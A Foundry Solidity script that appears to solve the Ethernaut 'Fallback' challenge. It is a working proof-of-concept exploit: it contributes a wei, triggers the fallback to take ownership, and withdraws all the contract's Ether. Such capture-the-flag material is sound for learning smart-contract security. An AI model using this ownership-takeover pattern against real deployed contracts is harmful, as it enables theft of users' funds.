// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel01.sol";

contract POC is Script {
    Fallback level1 = Fallback(0x14bbf818bAB5c831a0eF8AC95EDbC605F899CEf9);

    function run() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}(); // contribute some Ether/Wei
        level1.getContribution(); // check how much my contribution is
        address(level1).call{value: 1 wei}(""); // trigger the fallback function
        level1.owner(); // query new owner
        level1.withdraw(); // withdraw all the Ether

        vm.stopBroadcast();
    }
}

